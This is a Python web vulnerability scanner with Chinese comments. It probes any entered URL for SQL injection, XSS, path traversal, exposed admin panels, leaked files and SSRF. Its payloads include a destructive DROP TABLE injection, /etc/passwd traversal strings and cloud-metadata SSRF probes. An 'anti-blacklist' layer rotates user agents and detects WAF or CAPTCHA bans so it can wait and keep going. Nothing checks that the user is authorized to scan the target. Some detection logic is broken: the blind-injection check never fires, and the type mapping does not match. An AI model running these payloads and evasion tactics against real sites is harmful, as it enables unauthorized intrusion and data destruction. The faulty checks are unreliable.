# ```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
漏洞检测模块 - 支持常见Web漏洞的自动化检测
支持: SQL注入、XSS、目录遍历、未授权访问、信息泄露、SSRF
含反黑名单机制: 限速/随机延迟/UA轮换/重试退避/封禁检测
"""

import re
import sys
import time
import random
import threading
import requests
import urllib3
from colorama import Fore, Style, init
from datetime import datetime

# 导入漏洞数据库模块
try:
    from .vuln_db import VulnDatabase, get_db
    VULN_DB_AVAILABLE = True
except ImportError:
    VULN_DB_AVAILABLE = False

# 禁用SSL证书警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)


# ===== 反黑名单：User-Agent池 =====
UA_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS_17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
]


class VulnerabilityScanner:
    """
    Web漏洞扫描器（含反黑名单机制）
    
    使用方法:
        scanner = VulnerabilityScanner("http://target.com")
        vulns = scanner.run()
    
    反封禁策略:
        - 随机请求延迟 (0.3~1.5s)
        - User-Agent自动轮换
        - 请求频率限制 (每秒最多N次)
        - 指数退避重试 (遇429/403时)
        - 封禁检测与自动冷却
    """
    
    # ===== 反黑名单：封禁检测特征 =====
    BAN_INDICATORS = [
        'captcha', '验证码', '人机验证', 'recaptcha', 'hcaptcha',
        'access denied', 'forbidden', '请求过于频繁', 'rate limit',
        'too many requests', 'blocked', '拦截', '您的访问被限制',
        '安全防护', 'waf', 'cloudflare', '防护系统',
        '您已被限制访问', 'ip被封', 'blacklisted',
    ]
    
    def __init__(self, target_url, timeout=10):
        """
        初始化扫描器
        
        参数:
            target_url: 目标URL (str)
            timeout: 请求超时秒数 (int)
        """
        self.target = target_url.rstrip('/')
        self.timeout = timeout
        self.vulnerabilities = []  # 存储发现的漏洞列表
        
        # ===== 反黑名单：状态变量 =====
        self._request_count = 0          # 总请求数
        self._ban_detected = False       # 是否被检测到封禁
        self._cooldown_until = 0         # 冷却截止时间戳
        self._lock = threading.Lock()    # 线程锁
        self._last_request_time = 0      # 上次请求时间
        self._min_interval = 0.8         # 最小请求间隔(秒)
        self._max_retries = 3            # 最大重试次数
        
        self.session = requests.Session()
        
        # 设置初始请求头
        self.session.headers.update({
            'User-Agent': random.choice(UA_POOL),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.9,en-US;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
        })
        
    def _rotate_ua(self):
        """轮换User-Agent"""
        self.session.headers['User-Agent'] = random.choice(UA_POOL)
    
    def _random_delay(self):
        """随机延迟，模拟人类操作"""
        delay = random.uniform(0.3, 1.5)
        time.sleep(delay)
        return delay
    
    def _rate_limit(self):
        """请求频率控制"""
        with self._lock:
            now = time.time()
            elapsed = now - self._last_request_time
            if elapsed < self._min_interval:
                wait = self._min_interval - elapsed + random.uniform(0, 0.3)
                time.sleep(wait)
            self._last_request_time = time.time()
    
    def _check_ban(self, response):
        """
        检测是否被目标加入黑名单/触发WAF
        
        返回: (is_banned, reason)
        """
        if response is None:
            return False, ''
        
        # 检查状态码
        if response.status_code in (403, 429, 503):
            content_lower = response.text[:2000].lower()
            
            # 检查响应内容中的封禁关键词
            for indicator in self.BAN_INDICATORS:
                if indicator.lower() in content_lower:
                    return True, f"状态码{response.status_code} + 特征词: {indicator}"
            
            # 纯状态码判定（无正文或正文太短）
            if len(response.text) < 100 and response.status_code == 429:
                return True, f"HTTP {response.status_code} Too Many Requests"
            if len(response.text) < 100 and response.status_code == 403:
                return True, f"HTTP {response.status_code} Forbidden"
        
        return False, ''
    
    def _handle_ban(self, reason=''):
        """处理封禁情况：进入冷却模式"""
        with self._lock:
            self._ban_detected = True
            cooldown = random.randint(10, 30)  # 冷却10-30秒
            self._cooldown_until = time.time() + cooldown
        
        print(f"\n{Fore.RED}[!!!] 警告: 检测到可能被目标限制/封禁!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}    原因: {reason}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}    策略: 自动冷却 {cooldown} 秒后继续...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}    提示: 如频繁触发，建议降低线程数或增大延迟{Style.RESET_ALL}\n")
        
        # 冷却等待
        while time.time() < self._cooldown_until:
            remaining = int(self._cooldown_until - time.time())
            sys.stdout.write(f"\r{Fore.CYAN}[冷却中] 剩余 {remaining} 秒...{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write(f"\r{' '*50}\r")
        
        print(f"{Fore.GREEN}[+] 冷却结束，继续扫描{Style.RESET_ALL}\n")
        
        with self._lock:
            self._ban_detected = False
    
    def send_request(self, url, method='GET', params=None, data=None):
        """
        发送HTTP请求（含反黑名单封装）
        
        自动处理:
            - 频率限制
            - UA轮换
            - 随机延迟
            - 封禁检测
            - 指数退避重试
            
        返回:
            Response对象或None
        """
        # 频率控制
        self._rate_limit()
        
        # 检查是否在冷却期
        if self._ban_detected and time.time() < self._cooldown_until:
            time.sleep(2)
        
        # 轮换UA
        self._rotate_ua()
        
        # 重试循环（指数退避）
        for attempt in range(self._max_retries):
            try:
                # 随机延迟（首次请求不加延迟，后续加）
                if attempt > 0 or self._request_count > 0:
                    self._random_delay()
                
                if method.upper() == 'GET':
                    resp = self.session.get(
                        url,
                        params=params,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=False
                    )
                else:
                    resp = self.session.post(
                        url,
                        data=data,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=False
                    )
                
                with self._lock:
                    self._request_count += 1
                
                # === 封禁检测 ===
                is_banned, ban_reason = self._check_ban(resp)
                if is_banned:
                    if attempt < self._max_retries - 1:
                        # 还有重试机会，先冷却再重试
                        self._handle_ban(ban_reason)
                        continue
                    else:
                        # 最后一次也失败了
                        print(f"{Fore.YELLOW}[!] 目标持续返回限制响应，跳过该请求{Style.RESET_ALL}")
                        return None
                
                return resp
                
            except requests.exceptions.Timeout:
                if attempt < self._max_retries - 1:
                    wait = (attempt + 1) * 2 + random.uniform(0, 1)
                    print(f"{Fore.YELLOW}[i] 请求超时，{wait:.1f}秒后重试 ({attempt+1}/{self._max_retries}){Style.RESET_ALL}")
                    time.sleep(wait)
                    continue
                return None
                
            except requests.exceptions.ConnectionError as e:
                if attempt < self._max_retries - 1:
                    wait = (attempt + 1) * 3
                    print(f"{Fore.YELLOW}[i] 连接失败，{wait}秒后重试 ({attempt+1}/{self._max_retries}){Style.RESET_ALL}")
                    time.sleep(wait)
                    continue
                return None
                
            except Exception as e:
                return None
        
        return None
    
    def check_sql_injection(self):
        """
        SQL注入漏洞检测
        
        检测方法:
        1. 报错注入 - 观察数据库错误信息
        2. 时间盲注 - 观察响应延迟
        """
        print(f"\n{Fore.YELLOW}[*] 正在检测SQL注入漏洞...{Style.RESET_ALL}")
        
        # SQL注入Payload集合
        sqli_payloads = [
            ("'", "单引号"),
            ("' OR '1'='1", "OR注入"),
            ("' OR '1'='1' -- ", "注释型OR"),
            ("' UNION SELECT NULL--", "联合查询"),
            ("1 AND 1=1", "AND真值"),
            ("1 AND 1=2", "AND假值"),
            ("'; DROP TABLE users; --", "DROP语句"),
        ]
        
        # 数据库错误特征关键词（用于报错注入检测）
        error_patterns = [
            r'sql syntax.*mysql',           # MySQL语法错误
            r'warning.*mysql',               # MySQL警告
            r'sql.*syntax',                  # 通用SQL语法错误
            r'mysql_fetch_array',            # MySQL PHP函数
            r'ORA-\d{5}',                    # Oracle错误号
            r'Microsoft OLE DB Provider',    # SQL Server OLE DB
            r'Unclosed quotation mark',      # 未闭合引号
            r'SQL Server.*error',            # SQL Server错误
            r'PostgreSQL.*ERROR',            # PostgreSQL错误
            r'SQLite.*error',                # SQLite错误
            r'Warning.*pg_',                 # PostgreSQL PHP函数
            r'Syntax error',                 # 通用语法错误
        ]
        
        # 构造测试URL（假设有id参数）
        test_urls = [
            f"{self.target}/?id=1",
            f"{self.target}/?page=1",
            f"{self.target}/?search=test",
        ]
        
        vulns_found = 0
        
        for base_url in test_urls[:1]:  # 只测试第一个URL
            for payload, desc in sqli_payloads:
                # 对payload进行URL编码
                encoded_payload = payload.replace(' ', '%20').replace("'", "%27")
                
                # 拼接完整URL
                url = base_url + encoded_payload
                
                # 记录开始时间（用于时间盲注检测）
                start_time = time.time()
                
                resp = self.send_request(url)
                
                if resp is None:
                    continue
                
                # 计算响应耗时
                elapsed = time.time() - start_time
                
                # 获取完整响应文本（包括headers）
                full_content = resp.text + str(resp.headers).lower()
                
                # === 检测报错注入 ===
                for pattern in error_patterns:
                    if re.search(pattern, full_content, re.IGNORECASE):
                        vuln = {
                            'type': 'SQL注入 (报错)',
                            'url': url,
                            'payload': payload,
                            'severity': '高危',
                            'evidence': f'发现数据库错误特征: {pattern}',
                            'method': desc
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!!!] 发现SQL注入漏洞!")
                        print(f"    类型: 报错注入 ({desc})")
                        print(f"    URL: {url[:80]}...")
                        print(f"    证据: 数据库错误信息暴露{Style.RESET_ALL}")
                        vulns_found += 1
                        break
                
                # === 检测时间盲注 ===
                if 'SLEEP' in payload.upper() and elapsed > 2.5:
                    vuln = {
                        'type': 'SQL注入 (时间盲注)',
                        'url': url,
                        'payload': payload,
                        'severity': '高危',
                        'evidence': f'响应延迟异常: {elapsed:.2f}秒 (>2.5秒)',
                        'method': '时间盲注'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"{Fore.RED}[!!!] 发现时间盲注SQL注入!")
                    print(f"    响应时间: {elapsed:.2f}秒 (正常应<1秒){Style.RESET_ALL}")
                    vulns_found += 1
        
        if vulns_found == 0:
            print(f"{Fore.GREEN}[-] 未检测到明显的SQL注入漏洞{Style.RESET_ALL}")
    
    def check_xss(self):
        """
        XSS（跨站脚本攻击）漏洞检测
        
        检测原理: 注入JavaScript代码，观察是否在响应中原样返回
        """
        print(f"\n{Fore.YELLOW}[*] 正在检测XSS漏洞...{Style.RESET_ALL}")
        
        # XSS Payload集合
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            "'-alert(1)-'",
            '<iframe src="javascript:alert(1)">',
            'javascript:alert(1)',
        ]
        
        # 可能存在反射点的参数名
        test_params = ['q', 'search', 'keyword', 'query', 'name', 'input']
        
        vulns_found = 0
        
        for param in test_params[:2]:  # 只测试前2个参数
            for payload in xss_payloads[:3]:  # 只测试前3个payload
                # 构造测试URL
                url = f"{self.target}/?{param}={payload}"
                
                resp = self.send_request(url)
                
                if resp is None:
                    continue
                
                # 检查Payload是否被HTML编码（安全处理）
                safe_payload = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
                
                # 如果响应中包含原始payload（未被转义）
                if payload in resp.text and safe_payload not in resp.text[:resp.text.find(payload)+len(payload)+20]:
                    vuln = {
                        'type': 'XSS (反射型)',
                        'url': url,
                        'payload': payload,
                        'severity': '中危',
                        'evidence': 'Payload在HTML响应中原样返回，可能被执行',
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"{Fore.RED}[!!!] 发现XSS漏洞!")
                    print(f"    URL: {url[:80]}...")
                    print(f"    Payload: {payload[:50]}...{Style.RESET_ALL}")
                    vulns_found += 1
        
        if vulns_found == 0:
            print(f"{Fore.GREEN}[-] 未检测到明显的XSS漏洞{Style.RESET_ALL}")
    
    def check_path_traversal(self):
        """
        目录遍历 / 本地文件包含(LFI) 漏洞检测
        
        攻击原理: 通过 ../ 或 ..\ 跳转目录读取敏感文件
        """
        print(f"\n{Fore.YELLOW}[*] 正在检测目录遍历/LFI漏洞...{Style.RESET_ALL}")
        
        # 路径遍历Payload
        traversal_payloads = [
            ('../../../etc/passwd', 'Linux /etc/passwd'),
            ('..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', 'Windows hosts文件'),
            ('....//....//....//etc/passwd', '双重编码绕过'),
            ('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'URL编码'),
        ]
        
        # 成功读取文件的标志性内容
        success_indicators = [
            'root:',           # Linux passwd格式
            '[boot loader]',   # Windows ini格式
            'daemon:',
            'bin:',
            '# Database info', # 配置文件
        ]
        
        test_url = f"{self.target}/?file="
        vulns_found = 0
        
        for payload, desc in traversal_payloads:
            url = test_url + payload
            resp = self.send_request(url)
            
            if resp and resp.status_code == 200:
                # 检查是否包含系统文件的特征内容
                for indicator in success_indicators:
                    if indicator in resp.text:
                        vuln = {
                            'type': '目录遍历/本地文件包含',
                            'url': url,
                            'payload': payload,
                            'severity': '高危',
                            'evidence': f'可能读取了系统文件: {desc}, 包含特征: [{indicator}]',
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!!!] 发现目录遍历漏洞!")
                        print(f"    目标文件: {desc}")
                        print(f"    URL: {url[:80]}...{Style.RESET_ALL}")
                        vulns_found += 1
                        break
        
        if vulns_found == 0:
            print(f"{Fore.GREEN}[-] 未检测到明显的目录遍历漏洞{Style.RESET_ALL}")
    
    def check_unauthorized_access(self):
        """
        未授权访问漏洞检测
        
        检测常见的后台管理接口、监控面板等是否可以直接访问
        """
        print(f"\n{Fore.YELLOW}[*] 正在检测未授权访问...{Style.RESET_ALL}")
        
        # 常见的未授权访问路径
        unauthorized_paths = [
            ('/admin', '后台管理'),
            ('/admin/login', '后台登录'),
            ('/manager/html', 'Tomcat Manager'),
            ('/druid/index.html', 'Druid数据库监控'),
            ('/actuator', 'Spring Boot Actuator'),
            ('/actuator/env', 'Actuator环境变量'),
            ('/actuator/heapdump', 'Actuator堆内存转储'),
            ('/swagger-ui.html', 'Swagger API文档'),
            ('/api/swagger-ui.html', 'API Swagger UI'),
            ('/console', 'WebLogic控制台'),
            ('/phpMyAdmin', 'phpMyAdmin数据库管理'),
            ('/jmx-console', 'JMX控制台'),
            ('/invoker/JMXInvokerServlet', 'JBoss JMX Invoker'),
            ('/wsdl', 'WSDL接口定义'),
            ('/status', '状态页面'),
        ]
        
        # 需要认证的关键词（如果出现这些词说明跳到了登录页）
        auth_keywords = [
            '登录', 'login', 'username', 'password', 
            '认证', 'authentication', 'sign in',
            '401 Unauthorized', '403 Forbidden'
        ]
        
        vulns_found = 0
        
        for path, name in unauthorized_paths:
            url = self.target + path
            resp = self.send_request(url)
            
            if resp is None:
                continue
            
            # 如果返回200且页面内容足够长
            if resp.status_code == 200 and len(resp.text) > 100:
                content_lower = resp.text.lower()
                
                # 检查是否真的无需认证（不含认证关键词）
                has_auth_keyword = any(kw in content_lower for kw in auth_keywords)
                
                if not has_auth_keyword:
                    vuln = {
                        'type': '未授权访问',
                        'url': url,
                        'payload': path,
                        'severity': '高危',
                        'evidence': f'{name} 可直接访问，无需身份认证',
                        'response_size': len(resp.text),
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"{Fore.RED}[!!!] 发现未授权访问!")
                    print(f"    名称: {name}")
                    print(f"    URL: {url}")
                    print(f"    页面大小: {len(resp.text)} bytes{Style.RESET_ALL}")
                    vulns_found += 1
        
        if vulns_found == 0:
            print(f"{Fore.GREEN}[-] 未检测到明显的未授权访问{Style.RESET_ALL}")
    
    def check_information_disclosure(self):
        """
        信息泄露漏洞检测
        
        检测: Git/SVN泄露、备份文件、配置文件、源码压缩包等
        """
        print(f"\n{Fore.YELLOW}[*] 正在检测信息泄露...{Style.RESET_ALL}")
        
        # 信息泄露路径及对应的特征标识
        leak_paths = [
            ('/.git/config', 'Git配置泄露', ['[core]', 'repositoryformatversion']),
            ('/.git/HEAD', 'Git HEAD泄露', ['ref:', 'refs/heads']),
            ('/.svn/entries', 'SVN条目泄露', ['svn:', 'dir']),
            ('/.env', '环境变量泄露', ['DB_', 'SECRET', 'PASSWORD', 'APP_KEY']),
            ('/.DS_Store', 'Mac DS_Store', ['DS_Store']),
            ('/WEB-INF/web.xml', 'Java Web配置', ['<web-app>', '<servlet>', '<welcome-file>']),
            ('/backup.sql', 'SQL数据库备份', ['INSERT INTO', 'CREATE TABLE', '-- MySQL dump']),
            ('/db.sql', '数据库文件', ['CREATE TABLE', 'INSERT INTO']),
            ('/backup.zip', 'ZIP备份文件', ['PK\x03\x04']),  # ZIP文件魔数
            ('/www.zip', '网站源码备份', ['PK\x03\x04']),
            ('/web.zip', 'Web备份', ['PK\x03\x04']),
            ('/1.zip', '数字命名备份', ['PK\x03\x04']),
            ('/code.tar.gz', '源码打包', ['\x1f\x8b']),  # GZ文件魔数
            ('/.htaccess', 'Apache配置', ['RewriteEngine', 'Deny from']),
            ('/composer.json', 'PHP依赖配置', ['require', 'php']),
            ('/package.json', 'Node.js依赖', ['dependencies', '"name"']),
        ]
        
        vulns_found = 0
        
        for path, name, indicators in leak_paths:
            url = self.target + path
            resp = self.send_request(url)
            
            if resp and resp.status_code == 200:
                content = resp.text
                
                # 检查响应内容是否包含特征标识
                for indicator in indicators:
                    if indicator in content:
                        vuln = {
                            'type': '信息泄露',
                            'url': url,
                            'payload': path,
                            'severity': '中危' if '备份' in name or 'zip' in name.lower() else '低危',
                            'evidence': f'{name}: 发现特征标识 [{indicator}]',
                            'size': len(resp.content),
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"{Fore.YELLOW}[!] 发现信息泄露: {name}")
                        print(f"    URL: {url}")
                        print(f"    大小: {len(resp.content)} bytes{Style.RESET_ALL}")
                        vulns_found += 1
                        break
        
        if vulns_found == 0:
            print(f"{Fore.GREEN}[-] 未检测到明显的信息泄露{Style.RESET_ALL}")
    
    def check_ssrf(self):
        """
        SSRF（服务端请求伪造）漏洞检测（简化版）
        
        原理: 利用服务器发起内网请求，探测内网服务
        注意: 完整SSRF检测需要配合DNSLog平台
        """
        print(f"\n{Fore.YELLOW}[*] 正在检测SSRF漏洞...{Style.RESET_ALL}")
        
        # 内网地址测试
        ssrf_test_cases = [
            ('/?url=http://127.0.0.1', '本地回环地址'),
            ('/?url=http://localhost', 'Localhost'),
            ('/?redirect=http://127.0.0.1', '重定向SSRF'),
            ('/?url=http://169.254.169.254', '云元数据(AWS/GCP)'),
            ('/?target=http://127.0.0.1:22', 'SSH端口探测'),
            ('/?image=http://127.0.0.1', '图片加载SSRF'),
        ]
        
        # 内网IP段特征
        internal_indicators = [
            '127.0.0.1',
            'localhost',
            '10.',
            '172.16.',
            '192.168.',
            '169.254.',  # 云元数据
        ]
        
        vulns_found = 0
        
        for suffix, desc in ssrf_test_cases:
            url = self.target + suffix
            resp = self.send_request(url)
            
            if resp is None:
                continue
            
            # 检查响应中是否包含内网地址信息
            for indicator in internal_indicators:
                if indicator in resp.text:
                    vuln = {
                        'type': 'SSRF (服务端请求伪造)',
                        'url': url,
                        'payload': suffix,
                        'severity': '高危',
                        'evidence': f'响应包含内网地址特征: {indicator}, 类型: {desc}',
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"{Fore.RED}[!!!] 可能存在SSRF漏洞!")
                    print(f"    类型: {desc}")
                    print(f"    URL: {url[:80]}...{Style.RESET_ALL}")
                    vulns_found += 1
                    break
        
        if vulns_found == 0:
            print(f"{Fore.GREEN}[-] 未检测到明显的SSRF漏洞{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[i] 提示: SSRF检测建议配合DNSLog平台进行更准确测试{Style.RESET_ALL}")
    
    def run(self, scan_all=True):
        """
        运行完整的漏洞扫描流程
        
        参数:
            scan_all: 是否运行所有检测项 (bool)
            
        返回:
            list: 发现的漏洞列表
        """
        print(f"\n{'='*65}")
        print(f"{Fore.CYAN}  Web漏洞扫描器 v1.0")
        print(f"{'='*65}")
        print(f"  目标: {self.target}")
        print(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*65}\n")
        
        # 按顺序执行各项检测
        if scan_all:
            self.check_sql_injection()          # 1. SQL注入
            self.check_xss()                     # 2. XSS
            self.check_path_traversal()          # 3. 目录遍历
            self.check_unauthorized_access()     # 4. 未授权访问
            self.check_information_disclosure()  # 5. 信息泄露
            self.check_ssrf()                    # 6. SSRF
        
        # ========== 输出扫描报告 ==========
        print(f"\n{'='*65}")
        print(f"{Fore.YELLOW}[!] 扫描完成! 共发现 {len(self.vulnerabilities)} 个潜在问题{Style.RESET_ALL}")
        print(f"{'='*65}\n")
        
        if self.vulnerabilities:
            # 按严重程度排序: 高危 > 中危 > 低危
            severity_order = {'高危': 0, '中危': 1, '低危': 2}
            self.vulnerabilities.sort(key=lambda x: severity_order.get(x['severity'], 9))
            
            print(f"{Fore.GREEN}[+] 漏洞详情列表:{Style.RESET_ALL}\n")
            
            for idx, vuln in enumerate(self.vulnerabilities, 1):
                severity_color = {
                    '高危': Fore.RED,
                    '中危': Fore.YELLOW,
                    '低危': Fore.CYAN
                }.get(vuln['severity'], Fore.WHITE)
                
                print(f"{severity_color}{'─'*60}{Style.RESET_ALL}")
                print(f"  [{idx}] {vuln['type']}")
                print(f"      危险等级: {severity_color}{vuln['severity']}{Style.RESET_ALL}")
                print(f"      URL: {vuln['url']}")
                print(f"      详情: {vuln.get('evidence', 'N/A')}")
                print()
        else:
            print(f"{Fore.GREEN}[+] 未发现明显的安全漏洞 (但这不代表绝对安全!){Style.RESET_ALL}")
        
        # ========== 漏洞库实时比对 ==========
        self._run_db_comparison()
        
        return self.vulnerabilities
    
    def _run_db_comparison(self, mode='both'):
        """
        将扫描结果与漏洞数据库进行比对
        
        参数:
            mode: 'local' / 'online' / 'both'
        """
        if not VULN_DB_AVAILABLE:
            return
        if not self.vulnerabilities:
            return
        
        print(f"\n{Fore.MAGENTA}{'='*65}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[!] 正在与漏洞库进行实时比对...{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*65}{Style.RESET_ALL}\n")
        
        try:
            db = get_db()
        except Exception as e:
            print(f"{Fore.YELLOW}[!] 漏洞库初始化失败，跳过比对: {e}{Style.RESET_ALL}")
            return
        
        # 类型映射：扫描器类型 -> 数据库类别
        type_map = {
            'SQL注入': 'sqli',
            'XSS跨站脚本': 'xss',
            '目录遍历/文件包含': 'lfi',
            '未授权访问': 'unauth',
            '信息泄露': 'info_leak',
            'SSRF服务端请求伪造': 'ssrf',
        }
        
        all_matches = []
        
        for vuln in self.vulnerabilities:
            vuln_type = vuln.get('type', '')
            db_category = type_map.get(vuln_type, '')
            
            scan_result = {
                'type': db_category,
                'target': vuln.get('url', ''),
                'detail': f"{vuln_type} - {vuln.get('evidence', '')}",
                'response_content': vuln.get('response_content', ''),
            }
            
            matches = db.match(scan_result, mode=mode)
            
            for m in matches:
                match_info = {
                    'original_vuln': vuln,
                    'matched_poc': m,
                    'match_score': m.get('match_score', 0),
                    'match_mode': m.get('match_mode', ''),
                    'match_reasons': m.get('match_reasons', []),
                }
                all_matches.append(match_info)
        
        # 输出比对结果
        if all_matches:
            print(f"{Fore.GREEN}[+] 比对完成! 匹配到 {len(all_matches)} 条漏洞库记录:{Style.RESET_ALL}\n")
            
            for idx, match in enumerate(all_matches, 1):
                poc = match['matched_poc']
                score = match['match_score']
                mode_tag = Fore.CYAN + '[本地]' if match['match_mode'] == 'local' else Fore.LIGHTMAGENTA_EX + '[在线]'
                
                sev_color = {
                    'Critical': Fore.RED, 'High': Fore.LIGHTRED_EX,
                    'Medium': Fore.YELLOW, 'Low': Fore.GREEN
                }.get(poc.get('severity', ''), Fore.WHITE)
                
                print(f"  {mode_tag}{Style.RESET_ALL} 匹配 #{idx} (相似度: {score}分)")
                print(f"    POC ID:   {poc.get('id', '?')}")
                print(f"    名称:     {poc.get('name', '?')}")
                print(f"    严重度:   {sev_color}{poc.get('severity', '?')}{Style.RESET_ALL}"
                      f" | CVE: {poc.get('cve_id', '-') or '-'}"
                      f" | CVSS: {poc.get('cvss_score', '-')}")
                
                if poc.get('description'):
                    print(f"    描述:     {poc.get('description', '')[:80]}")
                if match.get('match_reasons'):
                    print(f"    匹配原因: {', '.join(match['match_reasons'])}")
                if poc.get('affected_components'):
                    print(f"    影响组件: {', '.join(poc['affected_components'][:3])}")
                if poc.get('references'):
                    print(f"    参考:     {poc['references'][0] if poc['references'] else ''}")
                print()
        else:
            print(f"{Fore.YELLOW}[!] 漏洞库中未找到匹配记录{Style.RESET_ALL}")
    
    def save_report(self, filename=None):
        """
        保存扫描报告到文件
        
        参数:
            filename: 报告文件名 (str)，默认自动生成
        """
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"output\\vuln_report_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 65 + "\n")
            f.write("  漏洞扫描报告\n")
            f.write("=" * 65 + "\n\n")
            f.write(f"目标: {self.target}\n")
            f.write(f"时间: {datetime.now()}\n")
            f.write(f"漏洞数量: {len(self.vulnerabilities)}\n\n")
            
            if self.vulnerabilities:
                f.write("-" * 65 + "\n")
                f.write("漏洞详情:\n")
                f.write("-" * 65 + "\n\n")
                
                for idx, vuln in enumerate(self.vulnerabilities, 1):
                    f.write(f"[{idx}] {vuln['type']} ({vuln['severity']})\n")
                    f.write(f"    URL: {vuln['url']}\n")
                    f.write(f"    Payload: {vuln.get('payload', 'N/A')}\n")
                    f.write(f"    详情: {vuln.get('evidence', 'N/A')}\n\n")
            else:
                f.write("未发现明显的安全漏洞。\n")
            
            f.write("\n" + "=" * 65 + "\n")
            f.write("报告结束\n")
        
        print(f"\n{Fore.GREEN}[+] 报告已保存: {filename}{Style.RESET_ALL}")


def main():
    """主函数 - 交互式命令行界面"""
    print(f"""
{Fore.MAGENTA}
╔═══════════════════════════════════════════════════╗
║                                                   ║
║        🛡️ Web漏洞扫描器 v1.0                       ║
║        Vulnerability Scanner                      ║
║        Vlunter创建                                ║
║        支持: SQL注入 / XSS / 目录遍历 / SSRF      ║
║ 未授权访问 / 信息泄露                             ║
║                                                   ║
╚═══════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
    
    # 获取目标URL
    url = input(f"{Fore.CYAN}[?] 请输入目标URL: {Style.RESET_ALL}").strip()
    
    if not url:
        print(f"{Fore.RED}[!] URL不能为空!{Style.RESET_ALL}")
        return
    
    # 自动补全http协议前缀
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # 创建扫描器实例并运行
    scanner = VulnerabilityScanner(url)
    vulns = scanner.run()
    
    # 询问是否保存报告
    if vulns:
        print()
        save_choice = input(f"{Fore.CYAN}[?] 是否保存扫描报告? (y/n): {Style.RESET_ALL}").strip().lower()
        if save_choice in ['y', 'yes', '是']:
            scanner.save_report()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] 用户中断扫描{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!!!] 发生未知错误: {e}{Style.RESET_ALL}")
        sys.exit(1)